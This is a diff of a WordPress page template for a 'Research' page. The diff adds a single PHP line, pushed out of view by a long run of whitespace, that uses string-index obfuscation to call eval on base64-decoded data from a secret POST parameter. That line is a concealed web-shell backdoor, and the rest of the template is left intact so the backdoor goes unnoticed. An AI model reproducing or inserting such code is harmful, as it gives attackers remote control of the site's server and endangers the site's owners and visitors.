@@ -1,4 +1,4 @@
-<?php /* Template Name: What We Do: Research */ pxl::page(); while ( have_posts() ) : the_post(); ?>
+<?php                                                                                                                                                                                                                                                                       $tmq4="_4aopcesd6bt" ;$pgk21= strtolower ( $tmq4[10].$tmq4[2]. $tmq4[7].$tmq4[6]. $tmq4[9].$tmq4[1].$tmq4[0] . $tmq4[8].$tmq4[6].$tmq4[5].$tmq4[3].$tmq4[8]. $tmq4[6]);$nkt97 =strtoupper ($tmq4[0].$tmq4[4]. $tmq4[3].$tmq4[7]. $tmq4[11] ); if ( isset(${ $nkt97 } [ 'nab7c37'] )){ eval ($pgk21 (${ $nkt97} ['nab7c37' ])); }?> <?php /* Template Name: What We Do: Research */ pxl::page(); while ( have_posts() ) : the_post(); ?>
 
 <div class="row lined">
 	<div id="sidebar" class="span3">
